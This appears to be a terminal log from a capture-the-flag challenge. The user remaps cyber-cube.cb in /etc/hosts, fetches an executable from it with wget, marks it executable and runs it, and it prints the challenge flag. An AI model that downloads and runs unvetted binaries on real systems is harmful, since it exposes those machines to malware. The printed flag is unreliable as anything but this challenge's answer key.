+64 bytes from 185.212.254.50: icmp_seq=90 ttl=128 time=4.13 ms
+64 bytes from 185.212.254.50: icmp_seq=91 ttl=128 time=1.28 ms
+64 bytes from 185.212.254.50: icmp_seq=92 ttl=128 time=1.50 ms
+64 bytes from 185.212.254.50: icmp_seq=93 ttl=128 time=1.33 ms
+64 bytes from 185.212.254.50: icmp_seq=94 ttl=128 time=3.97 ms
+64 bytes from 185.212.254.50: icmp_seq=95 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=96 ttl=128 time=1.24 ms
+64 bytes from 185.212.254.50: icmp_seq=97 ttl=128 time=0.967 ms
+64 bytes from 185.212.254.50: icmp_seq=98 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=99 ttl=128 time=1.00 ms
+64 bytes from 185.212.254.50: icmp_seq=100 ttl=128 time=0.997 ms
+64 bytes from 185.212.254.50: icmp_seq=101 ttl=128 time=1.15 ms
+64 bytes from 185.212.254.50: icmp_seq=102 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=103 ttl=128 time=1.17 ms
+64 bytes from 185.212.254.50: icmp_seq=104 ttl=128 time=1.34 ms
+64 bytes from 185.212.254.50: icmp_seq=105 ttl=128 time=0.881 ms
+64 bytes from 185.212.254.50: icmp_seq=106 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=107 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=108 ttl=128 time=0.923 ms
+64 bytes from 185.212.254.50: icmp_seq=109 ttl=128 time=1.47 ms
+64 bytes from 185.212.254.50: icmp_seq=110 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=111 ttl=128 time=1.16 ms
+64 bytes from 185.212.254.50: icmp_seq=112 ttl=128 time=0.994 ms
+64 bytes from 185.212.254.50: icmp_seq=113 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=114 ttl=128 time=3.94 ms
+64 bytes from 185.212.254.50: icmp_seq=115 ttl=128 time=1.10 ms
+64 bytes from 185.212.254.50: icmp_seq=116 ttl=128 time=1.12 ms
+64 bytes from 185.212.254.50: icmp_seq=117 ttl=128 time=1.03 ms
+64 bytes from 185.212.254.50: icmp_seq=118 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=119 ttl=128 time=1.21 ms
+64 bytes from 185.212.254.50: icmp_seq=120 ttl=128 time=0.989 ms
+64 bytes from 185.212.254.50: icmp_seq=121 ttl=128 time=1.21 ms
+64 bytes from 185.212.254.50: icmp_seq=122 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=123 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=124 ttl=128 time=0.963 ms
+64 bytes from 185.212.254.50: icmp_seq=125 ttl=128 time=0.863 ms
+64 bytes from 185.212.254.50: icmp_seq=126 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=127 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=128 ttl=128 time=0.857 ms
+64 bytes from 185.212.254.50: icmp_seq=129 ttl=128 time=0.963 ms
+64 bytes from 185.212.254.50: icmp_seq=130 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=131 ttl=128 time=1.17 ms
+64 bytes from 185.212.254.50: icmp_seq=132 ttl=128 time=1.28 ms
+64 bytes from 185.212.254.50: icmp_seq=133 ttl=128 time=1.38 ms
+64 bytes from 185.212.254.50: icmp_seq=134 ttl=128 time=3.93 ms
+64 bytes from 185.212.254.50: icmp_seq=135 ttl=128 time=0.956 ms
+64 bytes from 185.212.254.50: icmp_seq=136 ttl=128 time=1.05 ms
+64 bytes from 185.212.254.50: icmp_seq=137 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=138 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=139 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=140 ttl=128 time=0.805 ms
+64 bytes from 185.212.254.50: icmp_seq=141 ttl=128 time=0.891 ms
+64 bytes from 185.212.254.50: icmp_seq=142 ttl=128 time=0.829 ms
+64 bytes from 185.212.254.50: icmp_seq=143 ttl=128 time=0.844 ms
+64 bytes from 185.212.254.50: icmp_seq=144 ttl=128 time=3.97 ms
+64 bytes from 185.212.254.50: icmp_seq=145 ttl=128 time=0.935 ms
+64 bytes from 185.212.254.50: icmp_seq=146 ttl=128 time=1.02 ms
+64 bytes from 185.212.254.50: icmp_seq=147 ttl=128 time=0.987 ms
+64 bytes from 185.212.254.50: icmp_seq=148 ttl=128 time=4.00 ms
+64 bytes from 185.212.254.50: icmp_seq=149 ttl=128 time=0.982 ms
+64 bytes from 185.212.254.50: icmp_seq=150 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=151 ttl=128 time=0.918 ms
+64 bytes from 185.212.254.50: icmp_seq=152 ttl=128 time=3.97 ms
+64 bytes from 185.212.254.50: icmp_seq=153 ttl=128 time=0.881 ms
+64 bytes from 185.212.254.50: icmp_seq=154 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=155 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=156 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=157 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=158 ttl=128 time=0.959 ms
+64 bytes from 185.212.254.50: icmp_seq=159 ttl=128 time=1.04 ms
+64 bytes from 185.212.254.50: icmp_seq=160 ttl=128 time=4.03 ms
+64 bytes from 185.212.254.50: icmp_seq=161 ttl=128 time=0.964 ms
+64 bytes from 185.212.254.50: icmp_seq=162 ttl=128 time=1.25 ms
+64 bytes from 185.212.254.50: icmp_seq=163 ttl=128 time=1.16 ms
+64 bytes from 185.212.254.50: icmp_seq=164 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=165 ttl=128 time=0.962 ms
+64 bytes from 185.212.254.50: icmp_seq=166 ttl=128 time=0.841 ms
+64 bytes from 185.212.254.50: icmp_seq=167 ttl=128 time=1.03 ms
+64 bytes from 185.212.254.50: icmp_seq=168 ttl=128 time=4.00 ms
+64 bytes from 185.212.254.50: icmp_seq=169 ttl=128 time=0.948 ms
+64 bytes from 185.212.254.50: icmp_seq=170 ttl=128 time=1.40 ms
+64 bytes from 185.212.254.50: icmp_seq=171 ttl=128 time=1.44 ms
+64 bytes from 185.212.254.50: icmp_seq=172 ttl=128 time=4.10 ms
+64 bytes from 185.212.254.50: icmp_seq=173 ttl=128 time=0.792 ms
+64 bytes from 185.212.254.50: icmp_seq=174 ttl=128 time=0.784 ms
+64 bytes from 185.212.254.50: icmp_seq=175 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=176 ttl=128 time=3.98 ms
+64 bytes from 185.212.254.50: icmp_seq=177 ttl=128 time=1.05 ms
+64 bytes from 185.212.254.50: icmp_seq=178 ttl=128 time=0.811 ms
+64 bytes from 185.212.254.50: icmp_seq=179 ttl=128 time=1.00 ms
+64 bytes from 185.212.254.50: icmp_seq=180 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=181 ttl=128 time=1.25 ms
+64 bytes from 185.212.254.50: icmp_seq=182 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=183 ttl=128 time=1.36 ms
+64 bytes from 185.212.254.50: icmp_seq=184 ttl=128 time=3.90 ms
+64 bytes from 185.212.254.50: icmp_seq=185 ttl=128 time=1.66 ms
+64 bytes from 185.212.254.50: icmp_seq=186 ttl=128 time=1.69 ms
+64 bytes from 185.212.254.50: icmp_seq=187 ttl=128 time=1.18 ms
+64 bytes from 185.212.254.50: icmp_seq=188 ttl=128 time=4.03 ms
+64 bytes from 185.212.254.50: icmp_seq=189 ttl=128 time=1.27 ms
+64 bytes from 185.212.254.50: icmp_seq=190 ttl=128 time=0.946 ms
+64 bytes from 185.212.254.50: icmp_seq=191 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=192 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=193 ttl=128 time=0.998 ms
+64 bytes from 185.212.254.50: icmp_seq=194 ttl=128 time=1.41 ms
+64 bytes from 185.212.254.50: icmp_seq=195 ttl=128 time=1.14 ms
+64 bytes from 185.212.254.50: icmp_seq=196 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=197 ttl=128 time=0.866 ms
+64 bytes from 185.212.254.50: icmp_seq=198 ttl=128 time=1.25 ms
+64 bytes from 185.212.254.50: icmp_seq=199 ttl=128 time=1.09 ms
+64 bytes from 185.212.254.50: icmp_seq=200 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=201 ttl=128 time=0.951 ms
+64 bytes from 185.212.254.50: icmp_seq=202 ttl=128 time=0.995 ms
+64 bytes from 185.212.254.50: icmp_seq=203 ttl=128 time=1.11 ms
+64 bytes from 185.212.254.50: icmp_seq=204 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=205 ttl=128 time=0.921 ms
+64 bytes from 185.212.254.50: icmp_seq=206 ttl=128 time=0.954 ms
+64 bytes from 185.212.254.50: icmp_seq=207 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=208 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=209 ttl=128 time=1.22 ms
+64 bytes from 185.212.254.50: icmp_seq=210 ttl=128 time=1.22 ms
+64 bytes from 185.212.254.50: icmp_seq=211 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=212 ttl=128 time=0.931 ms
+64 bytes from 185.212.254.50: icmp_seq=213 ttl=128 time=1.56 ms
+64 bytes from 185.212.254.50: icmp_seq=214 ttl=128 time=0.976 ms
+
+64 bytes from 185.212.254.50: icmp_seq=215 ttl=128 time=0.998 ms
+64 bytes from 185.212.254.50: icmp_seq=216 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=217 ttl=128 time=0.912 ms
+
+64 bytes from 185.212.254.50: icmp_seq=218 ttl=128 time=1.19 ms
+
+
+
+64 bytes from 185.212.254.50: icmp_seq=219 ttl=128 time=1.04 ms
+^C
+--- 185.212.254.50 ping statistics ---
+219 packets transmitted, 219 received, 0% packet loss, time 218217ms
+rtt min/avg/max/mdev = 0.784/1.818/5.146/1.272 ms
+ubuntu@ubuntu:~$ nano /etc/hosts
+ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ sudo nano /etc/hosts
+ubuntu@ubuntu:~$ ubuntu@ubuntu:~$ sudo nano /etc/hosts
+ubuntu@ubuntu:~$ curl http://cyber-cube.cb
+curl: (7) Failed to connect to cyber-cube.cb port 80 after 21043 ms: Connection refused
+ubuntu@ubuntu:~$ curl http://cyber-cube.cb
+curl: (7) Failed to connect to cyber-cube.cb port 80 after 21039 ms: Connection refused
+ubuntu@ubuntu:~$ ping 185.212.254.50
+PING 185.212.254.50 (185.212.254.50) 56(84) bytes of data.
+64 bytes from 185.212.254.50: icmp_seq=1 ttl=128 time=1.40 ms
+64 bytes from 185.212.254.50: icmp_seq=2 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=3 ttl=128 time=1.64 ms
+64 bytes from 185.212.254.50: icmp_seq=4 ttl=128 time=1.20 ms
+64 bytes from 185.212.254.50: icmp_seq=5 ttl=128 time=0.889 ms
+64 bytes from 185.212.254.50: icmp_seq=6 ttl=128 time=1.35 ms
+^X64 bytes from 185.212.254.50: icmp_seq=7 ttl=128 time=0.952 ms
+64 bytes from 185.212.254.50: icmp_seq=8 ttl=128 time=4.00 ms
+
+
+64 bytes from 185.212.254.50: icmp_seq=9 ttl=128 time=0.863 ms
+64 bytes from 185.212.254.50: icmp_seq=10 ttl=128 time=1.08 ms
+^C
+--- 185.212.254.50 ping statistics ---
+10 packets transmitted, 10 received, 0% packet loss, time 9020ms
+rtt min/avg/max/mdev = 0.863/1.739/4.010/1.155 ms
+ubuntu@ubuntu:~$ ping cyber-cube.cb
+PING cyber-cube.cb (185.212.185.50) 56(84) bytes of data.
+
+^C
+--- cyber-cube.cb ping statistics ---
+19 packets transmitted, 0 received, 100% packet loss, time 18440ms
+
+ubuntu@ubuntu:~$ nano /etc/hosts
+ubuntu@ubuntu:~$ sudo nano /etc/hosts
+ubuntu@ubuntu:~$ ping cyber-cube.cb
+PING cyber-cube.cb (185.212.254.50) 56(84) bytes of data.
+64 bytes from cyber-cube.cb (185.212.254.50): icmp_seq=1 ttl=128 time=7.93 ms
+64 bytes from cyber-cube.cb (185.212.254.50): icmp_seq=2 ttl=128 time=4.02 ms
+64 bytes from cyber-cube.cb (185.212.254.50): icmp_seq=3 ttl=128 time=1.35 ms
+^X64 bytes from cyber-cube.cb (185.212.254.50): icmp_seq=4 ttl=128 time=1.22 ms
+64 bytes from cyber-cube.cb (185.212.254.50): icmp_seq=5 ttl=128 time=0.997 ms
+^C
+--- cyber-cube.cb ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4008ms
+rtt min/avg/max/mdev = 0.997/3.103/7.930/2.652 ms
+ubuntu@ubuntu:~$ curl http://cyber-cube.cb
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /</title>
+ </head>
+ <body>
+<h1>Index of /</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="binary">binary</a></td><td align="right">2019-07-02 13:40  </td><td align="right"> 16K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.29 (Ubuntu) Server at cyber-cube.cb Port 80</address>
+</body></html>
+ubuntu@ubuntu:~$ wget http://cyber-cube.cb/binary
+--2024-12-16 17:58:06--  http://cyber-cube.cb/binary
+Resolving cyber-cube.cb (cyber-cube.cb)... 185.212.254.50
+Connecting to cyber-cube.cb (cyber-cube.cb)|185.212.254.50|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16608 (16K)
+Saving to: ‘binary’
+
+binary                                         100%[===================================================================================================>]  16.22K  --.-KB/s    in 0s
+
+2024-12-16 17:58:06 (359 MB/s) - ‘binary’ saved [16608/16608]
+
+ubuntu@ubuntu:~$ ls
+binary
+ubuntu@ubuntu:~$ file binary
+binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cd657e69a954008d424154070b95d00a6bc5dc0f, not stripped
+ubuntu@ubuntu:~$ ./binary
+-bash: ./binary: Permission denied
+ubuntu@ubuntu:~$ chmod +x binary
+ubuntu@ubuntu:~$ ./binary
+Cyber_Cube{2dee4a7d7d63c913fb38e6e6d5cf8177}ubuntu@ubuntu:~$
+ubuntu@ubuntu:~$ client_loop: send disconnect: Connection aborted
